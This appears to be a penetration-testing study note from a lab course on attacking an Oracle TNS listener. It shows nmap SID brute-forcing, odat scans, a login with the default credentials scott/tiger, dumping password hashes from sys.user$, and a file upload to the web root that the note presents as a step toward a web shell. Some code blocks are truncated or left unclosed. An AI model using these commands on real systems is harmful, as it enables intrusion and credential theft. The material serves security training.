## Basic Information

Oracle database (Oracle DB) is a relational database management system (RDBMS) from the Oracle Corporation (from [here](https://www.techopedia.com/definition/8711/oracle-database)).

When enumerating Oracle the first step is to talk to the TNS-Listener that usually resides on the default port (1521/TCP, -you may also get secondary listeners on 1522‚Äì1529-).

```bash
sudo nmap -p1521 -sV 10.129.204.235 --open

1521/tcp open  oracle-tns    Oracle TNS Listener 9.2.0.1.0 (for 32-bit Windows)
1748/tcp open  oracle-tns    Oracle TNS Listener
```

### Default Configuration

The default TNS listener listens on TCP port 1521, but this can be changed in the configuration. TNS supports various protocols: TCP/IP, UDP, IPX/SPX, and AppleTalk. It also supports listening on specific IPs or all interfaces. Remote management is allowed by default in Oracle 8i/9i, but not in 10g/11g.

Security features include allowing only authorized hosts, basic authentication (hostnames, IPs, usernames, passwords), and encrypted communication via Oracle Net Services. Configuration files:
- `tnsnames.ora` (client-side)
- `listener.ora` (server-side)

Located in: `$ORACLE_HOME/network/admin`

### tnsnames.ora Example

```bash
ORCL =
  (DESCRIPTION =
    (ADDRESS_LIST =
      (ADDRESS = (PROTOCOL = TCP)(HOST = 10.129.11.102)(PORT = 1521))
    )
    (CONNECT_DATA =
      (SERVER = DEDICATED)
      (SERVICE_NAME = orcl)
    )
  )
```

This defines a service `ORCL` listening on `10.129.11.102:1521`, with `SERVICE_NAME = orcl`.

### listener.ora Example

```bash
SID_LIST_LISTENER =
  (SID_LIST =
    (SID_DESC =
      (SID_NAME = PDB1)
      (ORACLE_HOME = C:\oracle\product\19.0.0\dbhome_1)
      (GLOBAL_DBNAME = PDB1)
      (SID_DIRECTORY_LIST =
        (SID_DIRECTORY =
          (DIRECTORY_TYPE = TNS_ADMIN)
          (DIRECTORY = C:\oracle\product\19.0.0\dbhome_1\network\admin)
        )
      )
    )
  )

LISTENER =
  (DESCRIPTION_LIST =
    (DESCRIPTION =
      (ADDRESS = (PROTOCOL = TCP)(HOST = orcl.inlanefreight.htb)(PORT = 1521))
      (ADDRESS = (PROTOCOL = IPC)(KEY = EXTPROC1521))
    )
  )

ADR_BASE_LISTENER = C:\oracle
```

`listener.ora` controls the listener process, defining which services it handles and how it listens.

- Each database/service has a unique entry in `tnsnames.ora`
- Can include authentication, load balancing, and connection pooling
- Oracle services like DBSNMP may use default credentials (`dbsnmp`)
- Oracle 9 uses `CHANGE_ON_INSTALL` by default; Oracle 10 has none
- Legacy services like `finger` may pose risks if still enabled

### PL/SQL Exclusion List (PlsqlExclusionList)

A user-defined blacklist file placed in `$ORACLE_HOME/sqldeveloper`. It excludes PL/SQL packages/types from execution and can protect Oracle Application Server access.

---
We can see that the port is open, and the service is running. In Oracle RDBMS, a System Identifier (`SID`) is a unique name that identifies a particular database instance. It can have multiple instances, each with its own System ID. An instance is a set of processes and memory structures that interact to manage the database's data. When a client connects to an Oracle database, it specifies the database's `SID` along with its connection string. The client uses this SID to identify which database instance it wants to connect to. Suppose the client does not specify a SID. Then, the default value defined in the `tnsnames.ora` file is used.

The SIDs are an essential part of the connection process, as it identifies the specific instance of the database the client wants to connect to. If the client specifies an incorrect SID, the connection attempt will fail. Database administrators can use the SID to monitor and manage the individual instances of a database. For example, they can start, stop, or restart an instance, adjust its memory allocation or other configuration parameters, and monitor its performance using tools like Oracle Enterprise Manager.

There are various ways to enumerate, or better said, guess SIDs. Therefore we can use tools like `nmap`, `hydra`, `odat`, and others. Let us use `nmap` first.

#### Nmap - SID Bruteforcing

Oracle TNS

```shell-session
0xmid00@htb[/htb]$ sudo nmap -p1521 -sV 10.129.204.235 --open --script oracle-sid-brute

Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-06 11:01 EST
Nmap scan report for 10.129.204.235
Host is up (0.0044s latency).

PORT     STATE SERVICE    VERSION

|_  XE

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 55.40 seconds
```

We can use the `odat.py` tool to perform a variety of scans to enumerate and gather information about the Oracle database services and its components. Those scans can retrieve database names, versions, running processes, user accounts, vulnerabilities, misconfigurations, etc. Let us use the `all` option and try all modules of the `odat.py` tool.

#### ODAT

Oracle TNS

```shell-session
0xmid00@htb[/htb]$ ./odat.py all -s 10.129.204.235

[+] Checking if target 10.129.204.235:1521 is well configured for a connection...
[+] According to a test, the TNS listener 10.129.204.235:1521 is well configured. Continue...

...SNIP...

...SNIP...
```

In this example, we found valid credentials for the user `scott` and his password `tiger`. After that, we can use the tool `sqlplus` to connect to the Oracle database and interact with it.

#### SQLplus - Log In

Oracle TNS

```bash
 sqlplus <USER>/<PASS>@10.129.204.235/<SID>
 # EXAMPLE

If you come across the following error `sqlplus: error while loading shared libraries: libsqlplus.so: cannot open shared object file: No such file or directory`, please execute the below, taken from [here](https://stackoverflow.com/questions/27717312/sqlplus-error-while-loading-shared-libraries-libsqlplus-so-cannot-open-shared).

Oracle TNS

```shell-session
0xmid00@htb[/htb]$ sudo sh -c "echo /usr/lib/oracle/12.2/client64/lib > /etc/ld.so.conf.d/oracle-instantclient.conf";sudo ldconfig
```

There are many [SQLplus commands](https://docs.oracle.com/cd/E11882_01/server.112/e41085/sqlqraa001.htm#SQLQR985) that we can use to enumerate the database manually. For example, we can list all available tables in the current database or show us the privileges of the current user like the following:

#### Oracle RDBMS - Interaction

list all available tables 

```shell-session
SQL> select table_name from all_tables;

TABLE_NAME
------------------------------
DUAL
SYSTEM_PRIVILEGE_MAP
TABLE_PRIVILEGE_MAP
STMT_AUDIT_OPTION_MAP
AUDIT_ACTIONS
WRR$_REPLAY_CALL_FILTER
HS_BULKLOAD_VIEW_OBJ
HS$_PARALLEL_METADATA
HS_PARTITION_COL_NAME
HS_PARTITION_COL_TYPE
HELP

...SNIP...


SQL> select * from user_role_privs;

USERNAME                       GRANTED_ROLE                   ADM DEF OS_
------------------------------ ------------------------------ --- --- ---
SCOTT                          CONNECT                        NO  YES NO
SCOTT                          RESOURCE                       NO  YES NO
```

Here, the user `scott` has no administrative privileges. However, we can try using this account to log in as the System Database Admin (`sysdba`), giving us higher privileges. This is possible when the user `scott` has the appropriate privileges typically granted by the database administrator or used by the administrator him/herself.

USERNAME                       GRANTED_ROLE                   ADM DEF OS_
------------------------------ ------------------------------ --- --- ---
SYS                            DELETE_CATALOG_ROLE            YES YES NO
SYS                            EXECUTE_CATALOG_ROLE           YES YES NO
...SNIP...
```

We can follow many approaches once we get access to an Oracle database. It highly depends on the information we have and the entire setup. However, we can not add new users or make any modifications. From this point, we could retrieve the password hashes from the `sys.user$` and try to crack them offline. The query for this would look like the following:

#### Oracle RDBMS - Extract Password Hashes

Oracle TNS

```shell-session
SQL> select name, password from sys.user$;

NAME                           PASSWORD
------------------------------ ------------------------------
SYS                            FBA343E7D6C8BC9D
PUBLIC
CONNECT
RESOURCE
DBA
SYSTEM                         B5073FE1DE351687
SELECT_CATALOG_ROLE
EXECUTE_CATALOG_ROLE
DELETE_CATALOG_ROLE
OUTLN                          4A3BA55E08595C81
EXP_FULL_DATABASE

NAME                           PASSWORD
------------------------------ ------------------------------
IMP_FULL_DATABASE
LOGSTDBY_ADMINISTRATOR
...SNIP...
```

Another option is to upload a web shell to the target. However, this requires the server to run a web server, and we need to know the exact location of the root directory for the webserver. Nevertheless, if we know what type of system we are dealing with, we can try the default paths, which are:

|**OS**|**Path**|
|---|---|
|Linux|`/var/www/html`|
|Windows|`C:\inetpub\wwwroot`|

First, trying our exploitation approach with files that do not look dangerous for Antivirus or Intrusion detection/prevention systems is always important. Therefore, we create a text file with a string and use it to upload to the target system.

#### Oracle RDBMS - File Upload

Oracle TNS

```shell-session
0xmid00@htb[/htb]$ echo "Oracle File Upload Test" > testing.txt
0xmid00@htb[/htb]$ ./odat.py utlfile -s 10.129.204.235 -d XE -U scott -P tiger --sysdba --putFile C:\\inetpub\\wwwroot testing.txt ./testing.txt

[1] (10.129.204.235:1521): Put the ./testing.txt local file in the C:\inetpub\wwwroot folder like testing.txt on the 10.129.204.235 server                                                                                                  
[+] The ./testing.txt file was created on the C:\inetpub\wwwroot directory on the 10.129.204.235 server like the testing.txt file
```

Finally, we can test if the file upload approach worked with `curl`. Therefore, we will use a `GET http://<IP>` request, or we can visit via browser.

Oracle TNS

```shell-session
0xmid00@htb[/htb]$ curl -X GET http://10.129.204.235/testing.txt

Oracle File Upload Test
```
